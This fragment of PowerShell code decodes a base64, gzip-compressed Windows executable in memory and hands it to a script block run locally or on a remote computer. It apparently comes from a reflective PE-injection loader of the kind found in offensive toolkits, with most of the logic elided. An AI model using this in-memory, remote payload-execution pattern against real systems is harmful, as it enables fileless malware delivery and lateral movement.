...
#		}	
	...
	[Byte[]]$PECompressed = [Byte[]][Convert]::FromBase64String($PEEncoded)
	$i = New-Object System.IO.MemoryStream( , $PECompressed )
	$o = New-Object System.IO.MemoryStream
	$gz = New-Object System.IO.Compression.GzipStream $i, ([IO.Compression.CompressionMode]::Decompress)
	$b = New-Object byte[](1024)
	while($true){
		$read = $gz.Read($b, 0, 1024)
		if($read -le 0){break}
		$o.Write($b, 0, $read)
	}
	$gz.Close()
	$i.Close()
	[Byte[]]$PEBytes = $o.ToArray()
	$o.Close()
...
Function Main
{
	...
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEEncoded, "Void", 0, "", $ExeArgs)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEEncoded, "Void", 0, "", $ExeArgs) -ComputerName $ComputerName
	}
}
